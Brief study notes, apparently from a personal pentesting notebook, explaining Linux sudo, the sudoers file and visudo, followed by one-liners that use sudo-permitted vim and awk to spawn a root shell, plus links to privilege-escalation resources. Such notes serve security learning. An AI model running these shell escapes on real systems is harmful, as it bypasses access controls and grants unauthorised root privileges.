#### Sudo Overview
Sudo is a command in #Linux that allows users to run commands with privileges that only #root user have. It helps users to do tasks with administrative power without logging in as the root user, though sometimes it can be risky.

These users who can use the **sudo*** command need to have an entry in the **sudoers** file located at ****“/etc/sudoers”****.

***visudo*** - edits  the sudoers file in a safe fashion, analogous to ***vipw***.  visudo locks
       the sudoers file against multiple simultaneous edits, performs basic validity checks,
       and  checks  for syntax errors before installing the edited file.  If the sudoers file
       is currently being edited you will receive a message to try again later.
```
   sudo -l  # list commands allowed by sudo users
   sudo vim -c ':!/bin/sh' # switch user to root
   sudo vim -c ':!/bin/bash'
   sudo awk 'BEGIN {system("/bin/sh")}'
```
Great resources to #exploit sudo escaping
GTFOBins - [https://gtfobins.github.io/](https://gtfobins.github.io/)
Hacker Article - https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
